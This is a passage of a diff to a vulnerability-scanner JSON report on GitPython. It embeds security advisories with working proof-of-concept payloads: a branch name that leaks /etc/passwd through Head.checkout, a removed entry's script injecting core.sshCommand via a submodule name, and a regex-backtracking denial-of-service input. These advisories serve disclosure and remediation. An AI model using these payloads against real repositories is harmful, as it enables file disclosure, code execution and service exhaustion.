`validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62\n(latest release) with git 2.55.0, in the single run recorded in `poc.log`\n(2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.\n\n\n### Limits, stated plainly\n\n- Only the full long spelling works, because a refname cannot contain a space and is therefore a\n  single argv token; `git` rejects the abbreviated forms. This was established while developing the\n  payload and is **not** part of the attached run — the run exercises the working spelling only.\n- The attacker must know an absolute path to the target file.\n- Lines are disclosed only when they do not match a path in the repository. With a one-file hostile\n  repository none of them do, so the attacker controls this condition too.\n- The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per\n  unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the\n  first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for\n  `git checkout` on 2.55.0.\n\n## Negative control\n\nFull statement of what each control isolates and what would invalidate it: `negative-controls.md`.\nEvery batch opens **and closes** with a positive control; if the closing one does not fire, the batch\nis discarded.\n\n**Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file=\"/etc/passwd\")`\n— the same payload via kwargs. Fires in every batch:\n`UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.\nThis proves the guard exists, is active under the default, and recognises the option — so a null\nresult elsewhere cannot be the instrument failing to reach the code.\n\n**Negative control.** The identical call on a branch named `benigna`. One variable changes: the\nleading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.\n\n**Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).\nThe same payload against the two methods in `git/refs/head.py` that received the guard in the same\ncommit, 185 lines apart:\n\n```\n[CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos\n  HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]\n  Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]\n```\n\n`HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`\n(`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative\nexplanation that any string containing `--pathspec-from-file` reaching git would disclose the file.\n\n## Remediation\n\nOne line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:\n\n```python\n                options=Git._option_candidates([self], kwargs),\n```\n\n**The other candidate was evaluated and rejected.** Writing\n`self.repo.git.checkout(\"--\", self, **kwargs)` would match the `--` pattern used elsewhere in the\nlibrary and would also cover future `git checkout` options — but it **changes the semantics and\nbreaks the method**: in `git checkout -- <arg>`, everything after `--` is a *pathspec*, not a branch.\nThe command would stop switching branches and start restoring files. The `--` pattern works for\n`fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch\noperands; it does not transfer here.\n\nFor defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would\nalso close the weaker `PR:L` path. That is a separate, optional change.\n\n## Prior art and de-duplication\n\nAll GitPython advisories in the GitHub database were reviewed —\n`gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**\n(the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in\ntwo rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:\n\n- **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path\n  (`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is\n  the positive control in every batch of this report. The **positional** path is not covered by it.\n\nNeighbours, none overlapping:\n\n- **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only\n  guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the\n  patch that did not come back to `head.py:286`.\n- **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for \"a value placed before the `--` with no\n  leading-dash check\", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional\n  to the guard; this one does not.\n- **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.\n  Different sink (filesystem path construction) and different impact (write and delete), but it\n  establishes that attacker-influenced ref names is a premise this project has already accepted.\n\n### No open fix proposal\n\nSearched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,\n`gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request\nproposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this\nguard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that\nintroduced *both* call sites in this file, one checking its positional and one not. Full matrix in\n`dup-check.md`.\n\n### The project's own tests carry the same asymmetry\n\n`test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this\nreport is about:\n\n- `HEAD.reset` — the **positional** is tested (lines 304-308).\n- `Head.checkout` — only the **kwargs** path is tested (lines 282-291).\n\nSo the positional variant is a case the suite already knows how to write; it just was not written\nfor `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`\nrequires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path\ndoes not deliver. Nothing in the project declares the positional acceptable here.\n\n### Why the one-line fix works, which is not obvious\n\n`Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two\npath components (`reference.py:122-132`), so a `Head` constructed on\n`refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with\n`refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes\nthe guard see that same serialised string, which is why the one-line change closes it.\n\n## Evidence\n\n| File | What it establishes |\n|---|---|\n| `poc.sh` | driver — runs all seven scenarios as one unit |\n| `poc.log` | full transcript of the single reference run |\n| `raw/00-versions-and-source.txt` | version under test is the published one; guard and sink present; `def checkout(` appears once, so the sink line is unambiguous |\n| `raw/01-real-argv.txt` | real `git checkout` argv, captured by instrumenting `Git.execute` |\n| `raw/02-refname-accepted-and-cloned.txt` | git accepts the refname; `Repo.clone_from` materialises it unasked |\n| `raw/03-full-file-disclosure.txt` | 34 of 34 lines of `/etc/passwd` recovered |\n| `raw/04-precision-control-reset-vs-checkout.txt` | `HEAD.reset` blocks what `Head.checkout` allows |\n| `raw/05-six-line-consumer.txt` | six-line consumer, verbatim; leaks when the exception is logged and when it is uncaught |\n| `raw/06-push-accepts-refname.txt` | a plain git server accepts the refname over `push` |\n| `raw/07-blob-version-sweep.txt` | affected range by blob hash, tag by tag |\n| `negative-controls.md` | what each control isolates and what would invalidate it |\n| `evidence.sha256` | integrity of every raw file and script |\n\n## Disclosure\n\nReported privately through GitHub private vulnerability reporting. No third-party systems were\ntouched: every repository in this report is a temporary local one, and all transport is `file://`.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 7.1
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/8da65080849a56a2fc9f3e7817bbf0524e8397d5",
+            "https://github.com/gitpython-developers/GitPython/pull/2233",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.2.0",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-23mf-xhv8-69c2"
+          ],
+          "PublishedDate": "2026-10-27T15:28:03Z",
+          "LastModifiedDate": "2026-10-27T15:28:03Z"
         },
         {
           "VulnerabilityID": "GHSA-3f7w-8rr8-f37f",
@@ -1328,6 +1528,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-3f7w-8rr8-f37f",
+            "https://github.com/advisories/GHSA-3f7w-8rr8-f37f",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c",
             "https://github.com/gitpython-developers/GitPython/pull/2193",
@@ -1336,50 +1538,6 @@
           ],
           "PublishedDate": "2026-08-03T20:09:56Z",
           "LastModifiedDate": "2026-08-03T20:09:56Z"
-        },
-        {
-          "VulnerabilityID": "GHSA-3rp5-jjmw-4wv2",
-          "PkgName": "GitPython",
-          "PkgPath": "usr/local/lib/python3.7/site-packages/GitPython-3.1.11.dist-info/METADATA",
-          "PkgIdentifier": {
-            "PURL": "pkg:pypi/gitpython@3.1.11",
-            "UID": "7b34501ac43b3b82"
-          },
-          "InstalledVersion": "3.1.11",
-          "FixedVersion": "3.1.53",
-          "Status": "fixed",
-          "Layer": {
-            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
-            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://github.com/advisories/GHSA-3rp5-jjmw-4wv2",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory pip",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
-          },
-          "Fingerprint": "sha256:ba005b9abe8d118dfb7ee545a87f596f91ef963f01ca3eec0aff07780c4ab121",
-          "Title": "GitPython: git-config section-name injection enables arbitrary config directives (core.sshCommand RCE)",
-          "Description": "### Summary\n\nIn GitPython `<= 3.1.52`, the config writer neutralizes only CR, LF, and NUL in configuration **names**, but writes section names into the `[...]` header with no other escaping. A section/subsection name that contains `] [ \"` closes the intended header and opens a second same-line section, injecting an arbitrary config directive — with no newline required. Because a submodule **name** is attacker-controlled data (it comes from a repository's `.gitmodules`, or from an application that lets a user name a submodule) and is written verbatim into the parent repository's trusted `.git/config`, an attacker can set `core.sshCommand` (or `alias.*`, `core.pager`, `core.fsmonitor`) and achieve remote code execution on the victim's next git operation. Likely **CWE-74 (Injection)**.\n\nThis is a distinct variant of the injection addressed by GHSA-mv93-w799-cj2w / GHSA-v87r-6q3f-2j67: those fixed **newline** injection into config values/names (patched in 3.1.50); the `[r\\n\\x00]` guard added for them does not stop a **same-line** section break inside a name.\n\n### Details\n\nThe only guard applied to section/option names before writing is `_assure_config_name_safe`, which uses a regex that matches solely CR/LF/NUL:\n\n`git/config.py:75,897-899` (`GitPython 3.1.52`):\n\n```python\nUNSAFE_CONFIG_CHARS_RE = re.compile(r\"[\\r\\n\\x00]\")\n...\ndef _assure_config_name_safe(self, name: \"cp._SectionName\", label: str) -> None:\n    if isinstance(name, str) and UNSAFE_CONFIG_CHARS_RE.search(name):\n        raise ValueError(\"Git config %s names must not contain CR, LF, or NUL\" % label)\n```\n\nThe name is then serialized into the header with no escaping of `]`, `[`, `\"`, space, `=` or `#`:\n\n`git/config.py:693`:\n\n```python\nfp.write((\"[%s]\\n\" % name).encode(defenc))\n```\n\nFor submodules the name is wrapped as `submodule \"<name>\"` (`git/objects/submodule/util.py:39`, `return f'submodule \"{name}\"'`), which supplies the balancing quote. A submodule named:\n\n```\nx\"] [core] sshCommand=CMD #\n```\n\ntherefore serializes to the header `[submodule \"x\"] [core] sshCommand=CMD #\"]`. git parses everything after the first `]` on that line as a fresh section, yielding `core.sshCommand=CMD` (the trailing `#\"]` is an inline comment). No CR/LF/NUL appears, so `_assure_config_name_safe` never fires.\n\nThe attacker-controlled name reaches this sink through documented public entry points that write it into the parent repository's `.git/config`:\n\n- `Repo.create_submodule(name=<untrusted>, ...)` → `Submodule.add` → `git/objects/submodule/base.py:619` `writer.set_value(sm_section(name), \"url\", url)` — a single call, no hostile remote required.\n- `Repo.clone_from(<hostile url>)` + `repo.submodule_update(init=True)` → `git/objects/submodule/base.py:855` `writer.set_value(sm_section(self.name), \"url\", self.url)`, where `self.name` is read unvalidated from the cloned repo's `.gitmodules`.\n\nAsymmetry: the sibling class is blocked — a newline in a config **value**, e.g. `set_value(\"core\", \"editor\", \"x\\n\\tsshCommand=CMD\")`, raises `ValueError`. The section-**name** bracket payload is not caught by the same guard.\n\n### PoC\n\nSingle self-contained script, run against the pinned release in an ephemeral environment. Non-destructive: the injected value is an inert marker, verified parse-only with `git config --get`; no ssh/fetch/push is run and nothing is executed.\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PoC: git-config section-name injection in GitPython==3.1.52.\"\"\"\nfrom importlib.metadata import version\nimport os, tempfile, subprocess\nimport git\n\nprint(f\"# GitPython {version('GitPython')}\")        # version proof -- first line\n\nMARKER = \"MARKER_9f3a\"                               # inert; never executed\ntmp = tempfile.mkdtemp()\nenv = {**os.environ, \"HOME\": tmp,\n       \"GIT_CONFIG_GLOBAL\": os.path.join(tmp, \"gc\"), \"GIT_CONFIG_SYSTEM\": os.devnull,\n       \"GIT_AUTHOR_NAME\": \"a\", \"GIT_AUTHOR_EMAIL\": \"a@b.c\",\n       \"GIT_COMMITTER_NAME\": \"a\", \"GIT_COMMITTER_EMAIL\": \"a@b.c\"}\n\ndef run(*a, cwd=None):\n    return subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)\n\n# A benign local repo used as the submodule url (a plain path, no network).\nsrc = os.path.join(tmp, \"src\"); os.makedirs(src)\nrun(\"git\", \"init\", \"-q\", src)\nopen(os.path.join(src, \"f\"), \"w\").write(\"x\")\nrun(\"git\", \"add\", \"f\", cwd=src); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=src)\nsuburl = os.path.join(tmp, \"sub.git\"); run(\"git\", \"clone\", \"-q\", \"--bare\", src, suburl)\n\ndef parent_repo():\n    p = tempfile.mkdtemp(dir=tmp)\n    run(\"git\", \"init\", \"-q\", p)\n    open(os.path.join(p, \"r\"), \"w\").write(\"x\")\n    run(\"git\", \"add\", \"r\", cwd=p); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=p)\n    return p\n\ndef injected_sshcommand(parent):\n    r = run(\"git\", \"config\", \"-f\", os.path.join(parent, \".git\", \"config\"),\n            \"--get\", \"core.sshCommand\")\n    return (r.returncode, r.stdout.strip())\n\nbenign = \"docs\"\nevil   = f'x\"] [core] sshCommand={MARKER} #'          # closes the header, opens [core]\n\np_control = parent_repo()\ngit.Repo(p_control).create_submodule(name=benign, path=\"docs\", url=suburl)\np_exploit = parent_repo()\ngit.Repo(p_exploit).create_submodule(name=evil, path=\"sub\", url=suburl)\n\nctl = injected_sshcommand(p_control)\nexp = injected_sshcommand(p_exploit)\nheader = [l for l in open(os.path.join(p_exploit, \".git\", \"config\")).read().splitlines()\n          if l.startswith(\"[submodule\")][0]\n\nprint(\"control name :\", repr(benign))\nprint(\"  git core.sshCommand ->\", ctl, \"(unset)\")\nprint(\"exploit name :\", repr(evil))\nprint(\"  written header      ->\", header)\nprint(\"  git core.sshCommand ->\", exp)\n\nassert ctl[0] != 0 and ctl[1] == \"\", \"control unexpectedly set core.sshCommand\"\nassert exp == (0, MARKER), \"not reproduced\"\nprint(f\"VERDICT: attacker-controlled submodule name injected core.sshCommand={MARKER} \"\n      f\"into the victim's trusted .git/config (git would run it on the next ssh op)\")\n```\n\nRun:\n\n```bash\nuv run --with GitPython==3.1.52 python poc.py\n```\n\nObserved output:\n\n```\n# GitPython 3.1.52\ncontrol name : 'docs'\n  git core.sshCommand -> (1, '') (unset)\nexploit name : 'x\"] [core] sshCommand=MARKER_9f3a #'\n  written header      -> [submodule \"x\"] [core] sshCommand=MARKER_9f3a #\"]\n  git core.sshCommand -> (0, 'MARKER_9f3a')\nVERDICT: attacker-controlled submodule name injected core.sshCommand=MARKER_9f3a into the victim's trusted .git/config (git would run it on the next ssh op)\n```\n\nThe benign name yields a single clean `[submodule \"docs\"]` section; the malicious name yields an injected `core.sshCommand`. Deterministic across runs. The payload must use balanced double-quotes (an unbalanced `\"` makes git reject the header); the `submodule \"<name>\"` wrapper balances them automatically.\n\n### Impact\n\nArbitrary attacker-controlled write into the victim's repository-local `.git/config`, which git fully trusts. `core.sshCommand` is executed as the ssh transport command on the victim's next ssh git operation (fetch/pull/push), giving remote code execution; other injectable keys (`alias.*`, `core.pager`, `core.fsmonitor`) fire on more common operations. Reachable in default configuration through two realistic paths:\n\n- an application that constructs a submodule from untrusted input via `Repo.create_submodule(name=...)` (single call); or\n- `Repo.clone_from` of an untrusted repository followed by `submodule_update` — the canonical submodule threat model, where the malicious name is read from the cloned `.gitmodules`.\n\nNo non-default git settings are required. Primarily a Unix vector: on Windows the `\"` in the resulting `.git/modules/<name>` directory name can abort the fresh-clone write branch (the direct config-API and `create_submodule` sinks are unaffected).\n\n### Recommended fix\n\nReject or escape configuration section/subsection/option **names** that contain `]`, `[`, `\"`, or leading/trailing whitespace (or apply git's own section-name escaping) in `_assure_config_name_safe` / `write_section`, rather than only CR/LF/NUL. Validating submodule names before they reach `sm_section` would additionally close the clone-driven path.",
-          "Severity": "HIGH",
-          "VendorSeverity": {
-            "ghsa": 3
-          },
-          "CVSS": {
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
-              "V3Score": 7
-            }
-          },
-          "References": [
-            "https://github.com/gitpython-developers/GitPython",
-            "https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1",
-            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53",
-            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2"
-          ],
-          "PublishedDate": "2026-07-24T16:22:02Z",
-          "LastModifiedDate": "2026-07-24T16:22:02Z"
         },
         {
           "VulnerabilityID": "GHSA-6p8h-3wgx-97gf",
@@ -1417,6 +1575,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-6p8h-3wgx-97gf",
+            "https://github.com/advisories/GHSA-6p8h-3wgx-97gf",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/ffcb5359e87619f4fe4a70a4aff5f08c5580ba97",
             "https://github.com/gitpython-developers/GitPython/pull/2180",
@@ -1462,6 +1622,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-94p4-4cq8-9g67",
+            "https://github.com/advisories/GHSA-94p4-4cq8-9g67",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162",
             "https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2",
@@ -1509,6 +1671,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-fjr4-x663-mwxc",
+            "https://github.com/advisories/GHSA-fjr4-x663-mwxc",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/1d51b891d7f236044a6aa17498ec682b63dad6e6",
             "https://github.com/gitpython-developers/GitPython/pull/2180",
@@ -1554,6 +1718,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-jm78-9fvv-mhgr",
+            "https://github.com/advisories/GHSA-jm78-9fvv-mhgr",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/a495ccd3b547ccd60b2187215823b72a9c0188bf",
             "https://github.com/gitpython-developers/GitPython/pull/2204",
@@ -1562,6 +1728,51 @@
           ],
           "PublishedDate": "2026-08-07T15:46:35Z",
           "LastModifiedDate": "2026-08-07T15:46:35Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-m64x-33q8-m5h7",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/GitPython-3.1.11.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.11",
+            "UID": "7b34501ac43b3b82"
+          },
+          "InstalledVersion": "3.1.11",
+          "FixedVersion": "3.2.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-m64x-33q8-m5h7",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:0430ff491992496cb2766262b4514ab8e2ea1d501a8e184f068bb888abb6a52c",
+          "Title": "GitPython parse_actor_and_date() is vulnerable to quadratic backtracking on malformed identity lines",
+          "Description": "### Summary\n\nThis is a residual of GHSA-g5vv-9gxw-82hx / CVE-2026-87819. The 3.1.60 fix made `Actor._from_string` regex-free, but `parse_actor_and_date` still runs `_re_actor_epoch` on the same author/committer/tagger line one step earlier. That pattern backtracks quadratically when the trailing epoch or timezone is missing or malformed, so the same class of slow parse is still reachable in 3.1.62.\n\n### Details\n\n`git/objects/util.py:322`:\n\n```python\n_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n```\n\n`.+?` and `(.*)` can both absorb the same run of spaces, and the required ` (\\d+) ([+-]\\d+)` tail is only checked after them. On a long line with no valid tail, the search retries every split point.\n\nIt is called from `parse_actor_and_date` (`git/objects/util.py:335`), which runs on the author and committer lines in `Commit._deserialize` (`git/objects/commit.py:917`, `:931`) and on the tagger line in `git/objects/tag.py:129`.\n\nThe published payload (letters plus an unterminated `<`) is fast on 3.1.62. Replacing the letters with spaces is not:\n\n| author line (after `author `) | 2 KB | 8 KB | 32 KB |\n|---|---|---|---|\n| `'a'*n + ' <'` (advisory payload) | 0.0 ms | 0.1 ms | 0.4 ms |\n| `' '*n` | 28 ms | 453 ms | 7,700 ms |\n| valid line, long name (control) | 0.0 ms | 0.0 ms | 0.0 ms |\n\nCost grows about 16x for each 4x increase in length.\n\n### PoC\n\n```python\nimport time\nfrom git.objects.util import parse_actor_and_date\n\nline = \"author \" + \" \" * 32000\nt = time.perf_counter()\nparse_actor_and_date(line)\nprint(f\"{time.perf_counter() - t:.1f} s\")   # ~7 s on 3.1.62\n```\n\nEnd to end, reading `Commit.author` on a commit object whose author line is 32 KB of spaces followed by any malformed tail (no epoch, no timezone, non-numeric epoch, or bad timezone) takes about 7.2 s per access. The same line with a valid `1191999972 -0700` tail takes 1.3 ms.\n\nNote for reproducing: `git hash-object -t commit -w` refuses such an object (`missingEmail`), so the test object was written with `--literally`. A remote can still serve one, because `fetch.fsckObjects` and `transfer.fsckObjects` default to false. This is the same delivery model as CVE-2026-87819 (\"craft a commit object with a malformed author field\").\n\n### Impact\n\nCPU exhaustion (CWE-1333) in any application that uses GitPython to read commits or tags from an untrusted repository: CI tooling, repository scanners, code-hosting integrations. Each access to `Commit.author`, `Commit.committer` or `TagObject.tagger` on a crafted object costs seconds, and a repository can contain many such objects.\n\n### Suggested fix\n\nMatch the leading field name with `.[^ ]*` instead of `.+?`. Both stop at the first space after the first character, but `.[^ ]*` cannot overlap the following `(.*)`, so the backtracking disappears:\n\n```python\n_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n```\n\nVerification on current main (73a72c9):\n\n- Differential over 368 actor lines (real-world shapes plus edge cases): 0 differences in match groups for either regex.\n- `' '*n` at 64 KB: 32,170 ms before, 0.98 ms after. Valid lines are unchanged (0.01 ms).\n- The existing test suite gives the same pass/fail set with and without the change\n- The new regression test, `test_parse_actor_and_date_malformed_line_is_linear`, fails on the old pattern (8.4 s) and passes with the fix (0.5 s).\n\nThe full patch (fix plus regression test) is attached below.\n\n```diff\ndiff --git a/git/objects/util.py b/git/objects/util.py\nindex a68d701f..d8c0594d 100644\n--- a/git/objects/util.py\n+++ b/git/objects/util.py\n@@ -319,8 +319,11 @@ def parse_date(string_date: Union[str, datetime]) -> Tuple[int, int]:\n \n \n # Precompiled regexes\n-_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n-_re_only_actor = re.compile(r\"^.+? (.*)$\")\n+# The leading field name (\"author\", \"committer\", \"tagger\") is matched with ``.[^ ]*`` rather than\n+# ``.+?``: both stop at the first space after the first character, but ``.[^ ]*`` cannot overlap the\n+# following ``(.*)``, so a line with no valid trailing epoch/offset no longer backtracks quadratically.\n+_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n+_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n \n \n def parse_actor_and_date(line: str) -> Tuple[Actor, int, int]:\ndiff --git a/test/test_util.py b/test/test_util.py\nindex cf4299d5..e1631420 100644\n--- a/test/test_util.py\n+++ b/test/test_util.py\n@@ -22,6 +22,7 @@ from git.cmd import dashify\n from git.objects.util import (\n     altz_to_utctz_str,\n     from_timestamp,\n+    parse_actor_and_date,\n     parse_date,\n     tzoffset,\n     utctz_to_altz,\n@@ -571,6 +572,30 @@ class TestUtils(TestBase):\n             Actor(\"name last another\", \"some-very-long-email@example.com\"),\n         )\n \n+    def test_parse_actor_and_date_malformed_line_is_linear(self):\n+        # A long author line whose trailing epoch/offset is missing or malformed used to make\n+        # _re_actor_epoch backtrack quadratically: ~7 s per Commit.author access for a 32 KB line.\n+        # The parse result must be unchanged; only the time spent reaching it should move.\n+        for tail in (\"\", \" notanumber -0700\", \" 1191999972\", \" -0700\", \" 1191999972 xx\"):\n+            line = \"author \" + \" \" * 32000 + tail\n+            start = time.perf_counter()\n+            actor, epoch, offset = parse_actor_and_date(line)\n+            self.assertLess(time.perf_counter() - start, 1.0)\n+            self.assertEqual(epoch, 0)\n+            self.assertEqual(offset, 0)\n+\n+        # Well-formed lines, including one with a long name, still parse exactly as before.\n+        actor, epoch, offset = parse_actor_and_date(\n+            \"author Tom Preston-Werner <tom@mojombo.com> 1191999972 -0700\"\n+        )\n+        self.assertEqual(actor, Actor(\"Tom Preston-Werner\", \"tom@mojombo.com\"))\n+        self.assertEqual(epoch, 1191999972)\n+        self.assertEqual(offset, 25200)\n+\n+        actor, epoch, offset = parse_actor_and_date(\"author \" + \"a \" * 16000 + \"<a@b> 1 -0700\")\n+        self.assertEqual(actor.email, \"a@b\")\n+        self.assertEqual(epoch, 1)\n+\n     @ddt.data(\n         (\"name\", \"\"),\n         (\"name\", \"prefix_\"),\n```\n\nFound with AI assistance (Claude) and verified by hand.\n\nBrian Willows",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/8290c98d35465a38090cdcc1b17be69967092a15",
+            "https://github.com/gitpython-developers/GitPython/pull/2253",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.2.0",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-m64x-33q8-m5h7"
+          ],
+          "PublishedDate": "2026-10-27T15:26:24Z",
+          "LastModifiedDate": "2026-10-27T15:26:25Z"
         },
         {
           "VulnerabilityID": "GHSA-mv93-w799-cj2w",
@@ -1599,6 +1810,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-mv93-w799-cj2w",
+            "https://github.com/advisories/GHSA-mv93-w799-cj2w",
             "https://github.com/advisories/GHSA-rpm5-65cw-6hj4",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w"
@@ -1642,6 +1855,8 @@
             }
           },
           "References": [
+            "https://advisory.echohq.com/cve/GHSA-r9mr-m37c-5fr3",
+            "https://github.com/advisories/GHSA-r9mr-m37c-5fr3",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453",
             "https://github.com/gitpython-developers/GitPython/pull/2180",
@@ -1650,6 +1865,51 @@
           ],
           "PublishedDate": "2026-07-24T16:42:57Z",
           "LastModifiedDate": "2026-07-24T16:42:57Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-w8jc-g24h-crhw",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/GitPython-3.1.11.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.11",
+            "UID": "7b34501ac43b3b82"
+          },
+          "InstalledVersion": "3.1.11",
+          "FixedVersion": "3.2.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-w8jc-g24h-crhw",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:45ccc1d7d5fe1fc0f1d113167d5e1b159858067286bfe30498a0ef8aa8e5d2c3",
+          "Title": "GitPython command wrappers omit unsafe protocol and option checks",
